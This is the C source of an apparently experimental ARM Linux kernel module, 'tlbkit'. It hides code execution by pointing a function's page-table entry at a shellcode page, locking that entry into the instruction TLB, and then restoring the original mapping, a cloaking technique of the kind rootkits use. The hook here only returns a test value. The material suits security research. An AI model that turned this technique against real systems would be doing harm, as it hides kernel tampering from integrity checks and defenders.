#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h> // kmalloc
#include <linux/smp.h> // smp_processor_id
#include <linux/pgtable.h> // set_pte_at, not being linked
#include <asm/pgtable.h> // ?

#include <asm/proc-fns.h> // set_pte_ext
// #include <asm/tlbflush.h> // flush_tlb_all
// #include <asm/cacheflush.h> // flush_cache_mm

#include "include/assembler.h"
#include "include/set_page_flags.h"
#include "include/helpers.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("tlbkit");
MODULE_VERSION("0.1");

extern int tlbkit_bad(void);

extern void tlbkit_lockdown_itlb_addr(uint32_t addr);
extern void tlbkit_flush_tlb_overkill(void);



// extern void tlbkit_invl_dtlb_addr(uint32_t addr);
// extern void tlbkit_invl_itlb_addr(uint32_t addr);
// extern void tlbkit_flush_preload_dtlb(uint32_t addr);
// extern void tlbkit_flush_preload_itlb(uint32_t addr);


extern uint32_t tlbkit_read_itlb_lockdown(void);
extern uint32_t tlbkit_get_asid(void);
extern uint32_t tlbkit_read_c1(void);


void (*tlbkit_set_pte_at)(struct mm_struct *, unsigned long, pte_t *, pte_t) = NULL;

// update if shellcode changed
#define TLBKIT_HOOK_LEN 2

void internal_memcpy(void *dest, void *src, size_t n) {
   int i;
   char *src_char = (char *) src;
   char *dest_char = (char *) dest;
   for (i = 0; i < n; i++) {
       dest_char[i] = src_char[i];
   }
}

static int __init tlbkit_init(void)
{
    printk(KERN_INFO "tlbkit: module loaded, PAGE_SIZE %lx\n", PAGE_SIZE);
    printk(KERN_INFO "tlbkit: tlbkit_read_c1: %lx", tlbkit_read_c1());

    init_init_mm_ptr();
    tlbkit_set_pte_at = rk_kallsyms_lookup_name("set_pte_at");

    // run read/execute tests pre-hook insertion
    printk(KERN_INFO "tlbkit: PRE-HOOK\n");
    printk(KERN_INFO "          `tlbkit_bad()` returns %d\n", tlbkit_bad());
    printk(KERN_INFO "          `tlbkit_bad()` read returns %lx\n", *((uint32_t *) tlbkit_bad));

    printk(KERN_INFO "tlbkit: installing hook...\n");

    // allocate inst page (mov badca11, itlb)
    //      TODO: allocate this page as last page (omitted) in atag
    void *hook_page = kmalloc(PAGE_SIZE, GFP_KERNEL); // TODO: ensure cache-able
    // mov r0, 333
    // mov pc, lr
    unsigned char hook_shellcode[] = {
        0x4d, 0x01, 0x00, 0xe3, 0x0e, 0xf0, 0xa0, 0xe1,
    }; // 4d 01 00 e3 0e f0 a0 e1
    memcpy(hook_page, hook_shellcode, TLBKIT_HOOK_LEN * ARM64_INST_WIDTH);


    // save + update pgtables
    uint32_t hook_page_phys = virt_to_phys(hook_page);
    pte_t *orig_page_ptep = virt_to_ptep((uint32_t) tlbkit_bad);
    pte_t orig_page_pte = *orig_page_ptep;

    uint32_t orig_page_phys = highmem_pte_to_phys(orig_page_ptep); // maybe use virt_to_phys here ?

    printk(KERN_INFO "      tlbkit_get_asid: %lx\n", tlbkit_get_asid());
    printk(KERN_INFO "      tlbkit_bad: virt @%lx, phys@%lx\n", tlbkit_bad, orig_page_phys);
    printk(KERN_INFO "      hook_page: virt @%lx, phys@%lx\n", hook_page, hook_page_phys);

    preempt_disable();
    //      TODO: MARK PAGE AS GLOBAL, ASIDS NOT SHARED FOR ALL KERNEL THREADS, !! USES CURRENT !!
    // tlbkit_set_pte_at(init_mm_ptr, (uint32_t) tlbkit_bad, orig_page_ptep, pfn_pte(hook_page_phys >> PAGE_SHIFT, PAGE_KERNEL_EXEC));
    set_pte_ext(orig_page_ptep, pfn_pte(hook_page_phys >> PAGE_SHIFT, PAGE_KERNEL_EXEC),  0);

    // tlbkit_invl_itlb_addr((uint32_t) tlbkit_bad);
    // tlbkit_invl_dtlb_addr((uint32_t) tlbkit_bad);
    tlbkit_flush_tlb_overkill();

    // lockdown inst page tlb entry
    //      - check cloaker for access pattern
    //      ?? may need to also lockdown dtlb page to ensure itlb not used ??
    //      disable interrupts, grab spinlock on all CPU
    //      NOTE !! manual says prefetch inst is a nop ??
    printk(KERN_INFO "PRE LOCKDOWN ->  tlbkit_read_itlb_lockdown: %lx, smp_processor_id: %d\n", tlbkit_read_itlb_lockdown(), smp_processor_id());
    tlbkit_lockdown_itlb_addr((uint32_t) tlbkit_bad); // do on all cores ? check smp_processor_id
    printk(KERN_INFO "POST LOCKDOWN -> tlbkit_read_itlb_lockdown: %lx, smp_processor_id: %d\n", tlbkit_read_itlb_lockdown(), smp_processor_id());

    // replace orig pgtable entry + dtlb entry post hook install
    set_pte_ext(orig_page_ptep, orig_page_pte, 0);
    // flush dtlb, or we could lockdown dtlb before hook insertion ?
    // tlbkit_invl_dtlb_addr((uint32_t) tlbkit_bad);
    tlbkit_flush_tlb_overkill();

    preempt_enable();

    // run read/execute tests post-hook insertion
    printk(KERN_INFO "tlbkit: POST-HOOK\n");
    printk(KERN_INFO "          tlbkit_get_asid: %lx\n", tlbkit_get_asid());
    printk(KERN_INFO "          `tlbkit_bad()` returns %d, smp_processor_id: %d\n", tlbkit_bad(), smp_processor_id());
    uint32_t tmp;
    internal_memcpy(&tmp, tlbkit_bad, sizeof(uint32_t));
    printk(KERN_INFO "          `tlbkit_bad()` read copied returns %lx, smp_processor_id: %d\n", tmp, smp_processor_id());

    tlbkit_flush_tlb_overkill();
    return 0;
}

static void __exit tlbkit_exit(void)
{
    printk(KERN_INFO "tlbkit: module unloaded\n");
}

module_init(tlbkit_init);
module_exit(tlbkit_exit);
